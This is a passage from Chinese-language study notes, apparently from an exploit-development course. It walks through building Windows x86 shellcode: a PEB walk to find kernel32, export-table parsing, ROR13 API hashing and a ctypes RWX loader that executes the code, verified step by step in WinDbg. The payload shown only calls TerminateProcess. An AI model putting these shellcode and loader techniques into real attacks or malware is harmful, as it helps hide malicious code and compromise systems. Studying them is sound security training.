   +0x004 Blink            : 0x040180e0 _LIST_ENTRY [ 0x776c9abc - 0x40188c0 ]
```
LIST_ENTRY 的結構很簡單：
```cpp
typedef struct _LIST_ENTRY {
    struct _LIST_ENTRY *Flink;
    struct _LIST_ENTRY *Blink;
} LIST_ENTRY;
```
- Flink	Forward Link，下一個 Entry
- Blink	Backward Link，上一個 Entry

5. LIST_ENTRY 與 LDR_DATA_TABLE_ENTRY 的關係
因為 LIST_ENTRY 不是獨立存在的完整 Module 資料，而是嵌在更大的 LDR_DATA_TABLE_ENTRY 結構中，因此要先減去 0x10

>[!Tip]
>我們使用的是 `InInitializationOrderLinks` 位於：
`LDR_DATA_TABLE_ENTRY + 0x10`\
> 因此 LDR_DATA_TABLE_ENTRY Address = LIST_ENTRY Address - 0x10
> > 從嵌入式 Linked List Node 的位址，反推出外層 Structure 的起始位址。

```dbg
0:002> dt _LDR_DATA_TABLE_ENTRY (0x04011658 - 0x10)
ntdll!_LDR_DATA_TABLE_ENTRY
   +0x000 InLoadOrderLinks : _LIST_ENTRY [ 0x4011ab0 - 0x4011728 ]
   +0x008 InMemoryOrderLinks : _LIST_ENTRY [ 0x4011ab8 - 0x4011730 ]
   +0x010 InInitializationOrderLinks : _LIST_ENTRY [ 0x4011d88 - 0x776c9abc ]
   +0x018 DllBase          : 0x775c0000 Void
   +0x01c EntryPoint       : (null) 
   +0x020 SizeOfImage      : 0x17a000
   +0x024 FullDllName      : _UNICODE_STRING "C:\Windows\SYSTEM32\ntdll.dll"
   +0x02c BaseDllName      : _UNICODE_STRING "ntdll.dll"
   +0x034 FlagGroup        : [4]  "???"
   +0x034 Flags            : 0xa2c4
...
```
> - `+0x018 DllBase : 0x775c0000`: 真正想要的資訊，DllBase 儲存該 DLL 在目前 Process 中的 Base Address
> - `+0x02c BaseDllName : _UNICODE_STRING "ntdll.dll"`: 判斷目前找到的是哪一個 DLL

PEB Method 完整路徑\
![image](https://hackmd.io/_uploads/rkkzlqZRMx.png)

🏁：最終目的 DllBase = kernel32.dll 的 Base Address

### Assembling the Shellcode
- Keystone Framework：將 Assembly 轉成 Opcode
- Python ctypes：呼叫 Windows API
- VirtualAlloc：配置記憶體
- RtlMoveMemory：複製 Shellcode
- CreateThread：執行 Shellcode

import 兩個主要套件：
    - ctypes 從 Python 呼叫 Windows API
    - struct 將 Opcode 整理成 Byte
    - keystone 將 Assembly 轉換成 Opcode
```python
import ctypes, struct
from keystone import *

CODE = (

)
```
initialize the Keystone engine in 32-bit mode:
```python
...
)

# Initialize engine in X86-32bit mode
ks = Ks(KS_ARCH_X86, KS_MODE_32)
```
Assembly 轉換成 Opcode
```python
...
encoding, count = ks.asm(CODE)
print("Encoded %d instructions..." % count)

sh = b""
for e in encoding:
    sh += struct.pack("B", e)
shellcode = bytearray(sh)
```
> Keystone 將 Assembly 轉換成 Opcode, 將 Opcode 轉成 Byte, 結果整理成 Byte Array

[VirtualAlloc](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) 配置可執行記憶體，[RtlMoveMemory](https://docs.microsoft.com/en-us/windows/win32/devnotes/rtlmovememory) 將 Shellcode 複製到記憶體
```python
...
shellcode = bytearray(sh)

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                          ctypes.c_int(len(shellcode)),
                                          ctypes.c_int(0x3000),
                                          ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                     buf,
                                     ctypes.c_int(len(shellcode)))
```
> 將 Assembly 產生的 Opcode 寫入剛才配置的 RWX Memory\
> Windows API VirtualAlloc 四個參數：\
> ![image](https://hackmd.io/_uploads/rJI8f9-AMl.png)
> - `0x3000` = MEM_COMMIT | MEM_RESERVE
> - `0x40` =  [PAGE_EXECUTE_READWRITE](https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants)

[CreateThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createthread) 執行 Shellcode\
WinDbg attach 到 python.exe process
```python
...
print("Shellcode located at address %s" % hex(ptr))
input("...ENTER TO EXECUTE SHELLCODE...")

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.c_int(ptr),
                                         ctypes.c_int(0),
                                         ctypes.c_int(0),
                                         ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))
```

Shellcode Assembly 分析：
```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   sub   esp, 60h                  ;"  #

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
    "   mov   esi,fs:[ecx+30h]          ;"  #   ESI = &(PEB) ([FS:0x30])
    "   mov   esi,[esi+0Ch]             ;"  #   ESI = PEB->Ldr
    "   mov   esi,[esi+1Ch]             ;"  #   ESI = PEB->Ldr.InInitOrder
    
    " next_module:                      "  #
    "   mov   ebx, [esi+8h]             ;"  #   EBX = InInitOrder[X].base_address
    "   mov   edi, [esi+20h]            ;"  #   EDI = InInitOrder[X].module_name
    "   mov   esi, [esi]                ;"  #   ESI = InInitOrder[X].flink (next)
    "   cmp   [edi+12*2], cx            ;"  #   (unicode) modulename[12] == 0x00?
    "   jne   next_module               ;"  #   No: try next module.
    "   ret                             ;"  #
)
```
> `int3 ;` 是 Software Breakpoint，執行時會觸發 Debugger Exception，讓 WinDbg 停下來。只是為了方便 Debug，正式執行時應移除
> - `find_kernel32:` 前面 PEB Method 的實作
> - `next_module`：遍歷 Linked List

使用 WinDbg 確認 Shellcode 的執行流程
```powershell
C:\Users\offsec\Desktop> python find_kernel32.py
Encoded 16 instructions...
Shellcode located at address 0x11e0000
...ENTER TO EXECUTE SHELLCODE...
```
WinDbg attach python.exe process
```dbg
0:001> g
(10d0.f0c): Break instruction exception - code 80000003 (first chance)
eax=bea7140b ebx=00000000 ecx=011e0000 edx=011e0000 esi=011e0000 edi=011e0000
eip=011e0000 esp=013ffc9c ebp=013ffcac iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
011e0000 cc              int     3

0:001> u @eip Ld
011e0000 cc              int     3
011e0001 89e5            mov     ebp,esp
011e0003 83ec60          sub     esp,60h
011e0006 31c9            xor     ecx,ecx
011e0008 648b7130        mov     esi,dword ptr fs:[ecx+30h]
011e000c 8b760c          mov     esi,dword ptr [esi+0Ch]
011e000f 8b761c          mov     esi,dword ptr [esi+1Ch]
011e0012 8b5e08          mov     ebx,dword ptr [esi+8]
011e0015 8b7e20          mov     edi,dword ptr [esi+20h]
011e0018 8b36            mov     esi,dword ptr [esi]
011e001a 66394f18        cmp     word ptr [edi+18h],cx
011e001e 75f2            jne     011e0012
011e0020 c3              ret
```
> 第一個指令是 int3 所以 WinDbg 會停下來
> ```
> eip=011e0000
> esp=013ffc9c
> ebp=013ffcac
>
> 011e0000 cc int 3
> ```
> 反組譯 Shellcode，`@eip` 表示從目前 EIP 開始反組譯、`Ld` 表示顯示 d 個指令\
> ![image](https://hackmd.io/_uploads/rkRUli-0ze.png)

設定 Breakpoint 觀察第一個 Module
```dbg
0:001> bp 011e001a 

0:001> g
Breakpoint 0 hit
eax=bea7140b ebx=77020000 ecx=00000000 edx=011e0000 esi=00f11e60 edi=77026c08
eip=011e001a esp=013ffc3c ebp=013ffc9c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
011e001a 66394f18        cmp     word ptr [edi+18h],cx    ds:0023:77026c20=002e

0:001> r @ebx
ebx=77020000

0:001> du @edi
77026c08  "ntdll.dll"

0:001> lm m ntdll
Browse full module list
start    end        module name
77020000 7719a000   ntdll      (pdb symbols)          c:\symbols\ntdll.pdb\FA32EA7CECAA40BA94BF296AC6F178701\ntdll.pdb
```
> - EBX = 0x77020000 (Module 的 Base Address)
> - EDI = 0x77026c08 (Module 名稱的 Buffer Pointer)
> - du @edi: 檢查 DLL 名稱 (不是我們要找的 kernel32.dll)
> > EBX = 0x77020000 確實是 ntdll.dll 的 Base Address

繼續遍歷直到找到 kernel32.dll\
(`pt` 會執行到目前函式的 Return 指令)
```dbg
0:001> bc *

0:001> bl

0:001> pt
eax=bea7140b ebx=76e40000 ecx=00000000 edx=011e0000 esi=00f17930 edi=00f11c90
eip=011e0020 esp=013ffc3c ebp=013ffc9c iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
011e0020 c3              ret

0:001> r @ebx
ebx=76e40000

0:001> du @edi
00f11c90  "KERNEL32.DLL"

0:001> lm m kernel32
Browse full module list
start    end        module name
76e40000 76ed5000   KERNEL32   (pdb symbols)          c:\symbols\kernel32.pdb\F8E18714F7AC4AD1AC00CC0C6D41DD991\kernel32.pdb
```
> `kernel32.dll Base Address = 0x76e40000`

代表 Shellcode 已成功透過 PEB Method 找到 kernel32.dll 的 Base Address

## Resolving Symbols
不依賴 GetProcAddress，自行從 DLL 的 Export Table 找到 Windows API 的記憶體位址\
若希望呼叫 `TerminateProcess(GetCurrentProcess(), 0);` ，Shellcode 必須先知道 [TerminateProcess](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-terminateprocess) 在記憶體中的實際位址，才能呼叫

💡透過 PE 結構中的三個 Array，找到指定的 Export Function：
1. AddressOfNames
2. AddressOfNameOrdinals
3. AddressOfFunctions

解析 DLL 的 Export Address Table（EAT）\
最後將找到的 RVA 加上 DLL Base Address，得到 Function 的實際記憶體位址\
![image](https://hackmd.io/_uploads/SkDTCj-Afl.png)

### Export Directory Table
Windows DLL 如果要讓其他程式使用它提供的 Function，就需要透過 Export 機制公開這些函式

例如 kernel32.dll 會 Export 很多 Windows API：
```
LoadLibraryA
GetProcAddress
TerminateProcess
CreateThread
VirtualAlloc
...
```
這些 Function 的名稱和相關位址資訊，會記錄在 PE 結構中的 Export Directory

[Export Directory Table structure](https://doxygen.reactos.org/d5/db1/dll_2win32_2dbghelp_2compat_8h_source.html#l00145) contains additional fields:
```cpp
typedef struct _IMAGE_EXPORT_DIRECTORY {
  DWORD Characteristics;
  DWORD TimeDateStamp;
  WORD MajorVersion;
  WORD MinorVersion;
  DWORD Name;
  DWORD Base;
  DWORD NumberOfFunctions;
  DWORD NumberOfNames;
  DWORD AddressOfFunctions;
  DWORD AddressOfNames;
  DWORD AddressOfNameOrdinals;
}
```
> ![image](https://hackmd.io/_uploads/HyvKShWRGl.png)


真正會大量使用的是三個 Array ( `AddressOfNames`, `AddressOfNameOrdinals`, `AddressOfFunctions`)

>[!Important]
>三個 Array 之間的關係：\
>假設想找 `TerminateProcess`:
>1. 首先，必須從 AddressOfNames 找到這個名稱
>找到的位置是 `AddressOfNames[5]`，那麼就使用相同索引 5，查詢 `AddressOfNameOrdinals[5]`
>2. 假設 `AddressOfNameOrdinals[5]` 結果是 12，接著再使用 12 作為索引，查詢 `AddressOfFunctions[12]`
>3. 假設 `AddressOfFunctions[12]` 得到 0x12345，這就是 Function 的 RVA
>4. 最後： `VMA=DLL Base+RVA`\
> 假設 DLL Base Address：0x76e40000\
> 👉🏻 0x76e40000 + 0x12345 = 0x76e52345 (Function 的實際記憶體位址)
>
> ![image](https://hackmd.io/_uploads/Sy9GOhbAfg.png)
>> AddressOfNameOrdinals 裡面存放的是 AddressOfFunctions 的索引。因此不能直接把 Ordinal Array 的值當成 Function Address\
>> RVA 與 VMA:\
>> ![image](https://hackmd.io/_uploads/SJSvunZ0fg.png)\
>> "**VMA = 0x76e40000 + 0x75940**"

![image](https://hackmd.io/_uploads/S1F8Uh-Cfg.png)


### Working with the Export Names Array
找到 Export Directory，再取得 AddressOfNames Array，最後成功讀取其中的 Function Name
```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   sub   esp, 0x200                ;"  #
    "   call  find_kernel32             ;"  #
    "   call  find_function             ;"  #

    " find_kernel32:                     "  #
    "   xor   ecx, ecx                  ;"  #   ECX = 0
...
    " find_function:                     "  #
    "   pushad                          ;"  #   Save all registers
                                            #   Base address of kernel32 is in EBX from 
                                            #   Previous step (find_kernel32)
    "   mov   eax, [ebx+0x3c]           ;"  #   Offset to PE Signature
    "   mov   edi, [ebx+eax+0x78]       ;"  #   Export Table Directory RVA
    "   add   edi, ebx                  ;"  #   Export Table Directory VMA
    "   mov   ecx, [edi+0x18]           ;"  #   NumberOfNames
    "   mov   eax, [edi+0x20]           ;"  #   AddressOfNames RVA
    "   add   eax, ebx                  ;"  #   AddressOfNames VMA
    "   mov   [ebp-4], eax              ;"  #   Save AddressOfNames VMA for later

    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   ecx                       ;"  #   Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name
    
    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #
...
```
> `PUSHAD` 是 x86 指令，用來將一般用途的 32-bit Register 保存到 Stack\
> PE 結構位置:\
> ![image](https://hackmd.io/_uploads/SyL6miGCGg.png)
>
> 找到 Export Directory Table 
>```asm
>mov edi, [ebx+eax+0x78]
>add edi, ebx
>```
>- 實際讀取的位置: EBX+EAX+0x78\
>(`DLL Base Address` + `PE Header Offset` + `Export Directory RVA 欄位相對於 DLL Base 的 Offset`)\
>EDI = 0x00075940 是 Export Directory 的 RVA
>- 把 DLL Base Address 加上去， 0x75940+0x76e40000=0x76eb5940\
>因此 EDI = 0x76eb5940 指向 Export Directory Table 在記憶體中的位置\
>![image](https://hackmd.io/_uploads/HyLrBsM0Gg.png)

整段 Assembly 的完整流程:\
![image](https://hackmd.io/_uploads/H1npOizCGe.png)\
![image](https://hackmd.io/_uploads/rJ4PYsM0Mg.png)

WinDbg 實際驗證:
```dbg
0:002> g
(6b8.594): Break instruction exception - code 80000003 (first chance)
eax=055812f2 ebx=00000000 ecx=011e0000 edx=011e0000 esi=011e0000 edi=011e0000
eip=011e0000 esp=022bfe04 ebp=022bfe14 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
011e0000 cc              int     3

0:002> lm m kernel32
Browse full module list
start    end        module name
76e40000 76ed5000   KERNEL32   (pdb symbols)          c:\symbols\kernel32.pdb\F8E18714F7AC4AD1AC00CC0C6D41DD991\kernel32.pdb

0:002> dt ntdll!_IMAGE_DOS_HEADER 0x76e40000
   +0x000 e_magic          : 0x5a4d
   +0x002 e_cblp           : 0x90
...
   +0x03c e_lfanew         : 0n248

0:002> ? 0n248
Evaluate expression: 248 = 000000f8
```
> 1. 先確認 kernel32.dll Base Address: `EBX = 0x76e40000`
> 2. 取得 e_lfanew: \
> 0n248 表示十進位 248，e_lfanew = 0xF8\
> PE Header 位址：\
> 0x76e40000 + 0xF8 = `0x76e400F8`

```dbg
0:002> dt ntdll!_IMAGE_NT_HEADERS 0x76e40000 + 0xf8
   +0x000 Signature        : 0x4550
   +0x004 FileHeader       : _IMAGE_FILE_HEADER
   +0x018 OptionalHeader   : _IMAGE_OPTIONAL_HEADER

0:002> dt ntdll!_IMAGE_OPTIONAL_HEADER 0x76e40000 + 0xf8 + 0x18
   +0x000 Magic            : 0x10b
   +0x002 MajorLinkerVersion : 0xc ''
   +0x003 MinorLinkerVersion : 0xa ''
...
   +0x05c NumberOfRvaAndSizes : 0x10
   +0x060 DataDirectory    : [16] _IMAGE_DATA_DIRECTORY
```
> 3. 確認 Optional Header Offset:\
> Optional Header = NT Headers + 0x18 
> 再執行 `dt ntdll!_IMAGE_OPTIONAL_HEADER 0x76e40000 + 0xf8 + 0x18`\
> 取得 `+0x060 DataDirectory : [16] _IMAGE_DATA_DIRECTORY` 表示 Optional Header 中的 DataDirectory Array 從 Offset 0x60 開始

4. 確認 Export Directory Offset
PE 的 DataDirectory 是一個 Array。第一個 Entry `DataDirectory[0]` 就是 Export Directory

每個 `_IMAGE_DATA_DIRECTORY` 大小是 8 Bytes：
```cpp
typedef struct _IMAGE_DATA_DIRECTORY {
  DWORD VirtualAddress;
  DWORD Size;
} IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;
```
👉🏻 Optional Header + 0x60 就是 Export Directory Entry

[!dh](https://docs.microsoft.com/en-us/windows-hardware/drivers/debugger/-dh) 是 WinDbg 的 Display Headers Extension，-f 用來顯示 PE File Header 相關資訊
```dbg
0:002> dt ntdll!_IMAGE_DATA_DIRECTORY 0x76e40000 + 0xf8 + 0x78
   +0x000 VirtualAddress   : 0x75940
   +0x004 Size             : 0xd1c0
   
0:002> !dh -f kernel32

File Type: DLL
FILE HEADER VALUES
     14C machine (i386)
       6 number of sections
57CF8F7A time date stamp Tue Sep  6 20:54:34 2016

       0 file pointer to symbol table
       0 number of symbols
      E0 size of optional header
    2102 characteristics
            Executable
            32 bit word machine
            DLL

OPTIONAL HEADER VALUES
     10B magic #
   12.10 linker version
   82000 size of code
   12000 size of initialized data
       0 size of uninitialized data
   1DF30 address of entry point
    1000 base of code
...
    4140  DLL characteristics
            Dynamic base
            NX compatible
            Guard
   75940 [    D1C0] address [size] of Export Directory
   85354 [     4EC] address [size] of Import Directory
...
```
> 5. 直接讀取 Export Directory RVA
> - Export Directory RVA = 0x75940
> - `75940 [ D1C0] address [size] of Export Directory`
> 兩種方法得到相同的結果：`0x75940`\
> (已確認 Shellcode 使用的 Offset 是正確的)

使用 WinDbg 單步追蹤 Shellcode
```dbg
0:002> t
eax=000000f8 ebx=76e40000 ecx=00000000 edx=011e0000 esi=008178a0 edi=00811ca8
eip=011e0032 esp=022bfbe0 ebp=022bfe04 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
011e0032 8b7c0378        mov     edi,dword ptr [ebx+eax+78h] ds:0023:76e40170=00075940

0:002> t
eax=000000f8 ebx=76e40000 ecx=00000000 edx=011e0000 esi=008178a0 edi=00075940
eip=011e0036 esp=022bfbe0 ebp=022bfe04 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
011e0036 01df            add     edi,ebx

0:002> r edi
edi=00075940
```
> 當執行到 `mov edi, [ebx+eax+78h]`\
> eax=000000f8  ebx=76e40000 記憶體：ds:0023:76e40170=00075940 \
> 👉🏻 EDI = 0x00075940\
> 接著執行 `add edi, ebx`，理論上 EDI = 0x76eb5940\
> > 🥚 列出的 Register 狀態仍是 EDI=00075940， EIP 已經移到下一條 add edi, ebx 指令的位置。表示輸出是執行 add 之前的狀態，不能把它當成 add 已經執行完的結果\
> > 手動操作： `t`, `r edi` 就能確認轉換後的 VMA


7. 確認 AddressOfNames 最後一個 Symbol
```dbg
0:002> r
eax=76eb71ec ebx=76e40000 ecx=00000620 edx=011e0000 esi=76ec2af4 edi=76eb5940
eip=011e004e esp=022bfbe0 ebp=022bfe04 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
011e004e 61              popad

0:002> da esi
76ec2af4  "timeGetTime"
```
取得最後的 Function Name 是 timeGetTime

### Computing Function Name Hashes
目前已取得 AddressOfNames Array 的位置。Array 中存放的是 DLL 匯出函式名稱的 RVA
```
AddressOfNames
    |
    +--> "ActivateActCtx"
    +--> "AddAtomA"
    +--> "AddAtomW"
    +--> "AllocConsole"
    +--> ...
    +--> "TerminateProcess"
```
要從中找到 TerminateProcess，最直覺的方法是直接比較字串 `cmp esi, "TerminateProcess"`\
🥚 Shellcode 通常希望盡量縮小體積，也不希望在記憶體中直接留下完整 API 名稱

可以採用 Hashing Algorithm
```
TerminateProcess
        |
        v
  Hashing Algorithm
        |
        v
    0x78B5B983
```
這樣 Shellcode 只需要保存一個 DWORD（4 bytes）的 Hash，就能辨識目標函式

Hashing Algorithm 的 Assembly:
1. 初始化暫存器
2. 一次讀取一個字元
3. 對 EDX 執行 ROR
4. 將目前字元的數值加入 EDX
5. 重複直到遇到 NULL
6. 最後 EDX 即是產生的 Hash
```asm
    " compute_hash:                      "  #
    "   xor   eax, eax                  ;"  #   NULL EAX
    "   cdq                             ;"  #   NULL EDX
    "   cld                             ;"  #   Clear direction

    " compute_hash_again:                "  #
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set, we've hit the NULL term
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration

    " compute_hash_finished:             "  #
```
> - [CDQ](https://intel.github.io/SDM/instruction/CWD-CDQ-CQO.html) Convert Doubleword to Quadword 會根據 EAX 的最高位（Sign Bit），將 EAX 的符號延伸到 EDX 
> - [CLD](https://intel.github.io/SDM/instruction/CLD.html) Clear Direction Flag 會清除 EFLAGS 裡面的 DF（Direction Flag）。DF = 0 會影響 x86 String Instructions 的操作方向\
>    - 0: ESI / EDI 遞增
>    - 1: ESI / EDI 遞減
>- `LODSB` Load String Byte。功能 AL = BYTE PTR [ESI]\
>然後依照 DF 自動調整 ESI：
>    - DF = 0 → ESI = ESI + 1
>    - DF = 1 → ESI = ESI - 1
> - `ror edx, 0x0d`：Hash 的核心\
> [ROR](https://intel.github.io/SDM/instruction/RCL-RCR-ROL-ROR.html) = Rotate Right 會將 EDX 的 Bit 向右旋轉 13 個位置 (也就是 ROR EDX, 13)


在 WinDbg 實際操作
```dbg
0:002> r @eax=0x41

0:002> a @eip
02630000 ror eax, 0x01
ror eax, 0x01
02630002 

0:002> .formats @eax
Evaluate expression:
  Hex:     00000041
  Decimal: 65
  Octal:   00000000101
  Binary:  00000000 00000000 00000000 01000001
  Chars:   ...A
  Time:    Wed Dec 31 16:01:05 1969
  Float:   low 9.10844e-044 high 0
  Double:  3.21143e-322

0:002> t
eax=80000020 ebx=00000000 ecx=02630000 edx=02630000 esi=02630000 edi=02630000
eip=02630002 esp=0282f9fc ebp=0282fa0c iopl=0         ov up ei pl zr na pe cy
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000a47
02630002 e581            in      eax,81h

0:002> .formats @eax
Evaluate expression:
  Hex:     80000020
  Decimal: -2147483616
  Octal:   20000000040
  Binary:  10000000 00000000 00000000 00100000
  Chars:   ... 
  Time:    ***** Invalid
  Float:   low -4.48416e-044 high -1.#QNAN
  Double:  -1.#QNAN
```
> 原本：`00000000 00000000 00000000 01000001`\
右旋轉一個 Bit `10000000 00000000 00000000 00100000`\
> EAX = 0x80000020 就是以上理解的 ROR 操作

Hash 一輪計算流程：
```
讀取字元
   |
   v
LODSB
   |
   v
檢查是否 NULL
   |
   v
ROR EDX, 13
   |
   v
ADD EDX, EAX
   |
   v
讀取下一個字元
```

用 Python 重現 Hash 演算法
```python
#!/usr/bin/python
import numpy, sys

def ror_str(byte, count):
    binb = numpy.base_repr(byte, 2).zfill(32)
    while count > 0:
        binb = binb[-1] + binb[0:-1]
        count -= 1
    return int(binb, 2)

if __name__ == '__main__':
    try:
        esi = sys.argv[1]
    except IndexError:
        print("Usage: %s INPUTSTRING" % sys.argv[0])
        sys.exit()

    edx = 0x00
    ror_count = 0

    for eax in esi:
        edx = edx + ord(eax)
        if ror_count < len(esi)-1:
            edx = ror_str(edx, 0xd)
        ror_count += 1

    print(hex(edx))
```

在執行 Shellcode 之前，就能先計算出目標 API 的 Hash
```powershell
C:\Users\admin\Desktop> python ComputeHash.py timeGetTime
0x998eaf95
```
使用 WinDbg 驗證 Hash
```dbg
0:002> r
eax=6f23d2c2 ebx=76e40000 ecx=00000000 edx=02a30000 esi=01276d78 edi=01271ca8
eip=02a3002e esp=02c2f594 ebp=02c2f798 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02a3002e 60              pushad

0:002> u @eip L18
02a3002e 60              pushad
...
02a30043 e319            jecxz   02a3005e
02a30045 49              dec     ecx
02a30046 8b45fc          mov     eax,dword ptr [ebp-4]
02a30049 8b3488          mov     esi,dword ptr [eax+ecx*4]
02a3004c 01de            add     esi,ebx
02a3004e 31c0            xor     eax,eax
02a30050 99              cdq
02a30051 fc              cld
02a30052 ac              lods    byte ptr [esi]
02a30053 84c0            test    al,al
02a30055 7407            je      02a3005e
02a30057 c1ca0d          ror     edx,0Dh
02a3005a 01c2            add     edx,eax
02a3005c ebf4            jmp     02a30052
02a3005e 61              popad
02a3005f c3              ret

0:002> bp 02a3004e 

0:002> bp 02a3005e 

0:002> bl
     0 e Disable Clear  02a3004e     0001 (0001)  0:**** 
     1 e Disable Clear  02a3005e     0001 (0001)  0:**** 
```
設定兩個 bp:
- 02a3004e	Hash 計算開始前，確認目前要計算哪個 API 名稱
- 02a3005e	Hash 計算完成後，確認 EDX 最終結果
```dbg
0:002> g
Breakpoint 0 hit
eax=76eb71ec ebx=76e40000 ecx=00000620 edx=02a30000 esi=76ec2af4 edi=76eb5940
eip=02a3004e esp=02c2f574 ebp=02c2f798 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
02a3004e 31c0            xor     eax,eax

0:002> da @esi
76ec2af4  "timeGetTime"

0:002> g
Breakpoint 1 hit
eax=00000000 ebx=76e40000 ecx=00000620 edx=998eaf95 esi=76ec2b00 edi=76eb5940
eip=02a3005e esp=02c2f574 ebp=02c2f798 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
02a3005e 61              popad

0:002> r edx
edx=998eaf95
```
- Python : 0x998eaf95
- WinDbg : 0x998eaf95

代表 Assembly Hash Function 已經能正確產生教材預期的 Hash
### Fetching the VMA of a Function
前面已完成：
1. 找到 kernel32.dll
2. 找到 PE Export Directory
3. 找到 AddressOfNames
4. 逐一讀取 API 名稱
5. 計算每個 API 名稱的 Hash

👉🏻 利用 Hash 找到目標 API，並取得它真正的記憶體位址: TerminateProcess

```python
import ctypes, struct
from keystone import *

CODE = (
    " start:                             "  #
    "   int3                            ;"  #   Breakpoint for Windbg. REMOVE ME WHEN NOT DEBUGGING!!!!
    "   mov   ebp, esp                  ;"  #
    "   sub   esp, 0x200                ;"  #
    "   call  find_kernel32             ;"  #
    "   push  0x78b5b983                ;"  #   TerminateProcess hash
    "   call  find_function             ;"  #
    "   xor   ecx, ecx                  ;"  #   Null ECX
    "   push  ecx                       ;"  #   uExitCode
    "   push  0xffffffff                ;"  #   hProcess
    "   call  eax                       ;"  #   Call TerminateProcess
...
    " find_function_loop:                "  #
    "   jecxz find_function_finished    ;"  #   Jump to the end if ECX is 0
    "   dec   ecx                       ;"  #   Decrement our names counter
    "   mov   eax, [ebp-4]              ;"  #   Restore AddressOfNames VMA
    "   mov   esi, [eax+ecx*4]          ;"  #   Get the RVA of the symbol name
    "   add   esi, ebx                  ;"  #   Set ESI to the VMA of the current symbol name
...
    " compute_hash_again:                "  #
    "   lodsb                           ;"  #   Load the next byte from esi into al
    "   test  al, al                    ;"  #   Check for NULL terminator
    "   jz    compute_hash_finished     ;"  #   If the ZF is set,we've hit the NULL term
    "   ror   edx, 0x0d                 ;"  #   Rotate edx 13 bits to the right
    "   add   edx, eax                  ;"  #   Add the new byte to the accumulator
    "   jmp   compute_hash_again        ;"  #   Next iteration
    
    " compute_hash_finished:             "  #

    " find_function_compare:             "  #
    "   cmp   edx, [esp+0x24]           ;"  #   Compare the computed hash with the requested hash
    "   jnz   find_function_loop        ;"  #   If it doesn't match go back to find_function_loop
...

    " find_function_finished:            "  #
    "   popad                           ;"  #   Restore registers
    "   ret                             ;"  #
```
1. 先準備 TerminateProcess 的 Hash
```asm
push 0x78b5b983
call find_function
```
> `0x78B5B983` 就是 Hash("TerminateProcess")

find_function 會遍歷 AddressOfNames，計算每個 API 名稱的 Hash。比較目前計算出來的 Hash VS 預先指定的 Hash\
若相同，就代表找到目標 API

2. find_function_compare
```asm
find_function_compare:
    cmp   edx, [esp+0x24]
    jnz   find_function_loop

    mov   edx, [edi+0x24]
    add   edx, ebx

    mov   cx, [edx+2*ecx]

    mov   edx, [edi+0x1c]
    add   edx, ebx

    mov   eax, [edx+4*ecx]
    add   eax, ebx

    mov   [esp+0x1c], eax
```
2.1 比較 Hash\
`cmp edx, [esp+0x24]`\
2.2 取得 AddressOfNameOrdinals\
`mov edx, [edi+0x24]`, `add edx, ebx`\
2.3 取得 Function Ordinal Index\
`mov cx, [edx+2*ecx]`\
2.4 取得 AddressOfFunctions\
`mov edx, [edi+0x1c]`, `add edx, ebx`\
![image](https://hackmd.io/_uploads/HJ3KEbXCzx.png)


PUSHAD 會保存當下的 8 個 32-bit General Purpose Register:\
![image](https://hackmd.io/_uploads/r1thNWXRGl.png)
`mov [esp+0x1c], eax` 是為了把剛剛取得的 Function VMA，覆寫到原本保存 EAX 的位置

3. 在 WinDbg 驗證 TerminateProcess VMA
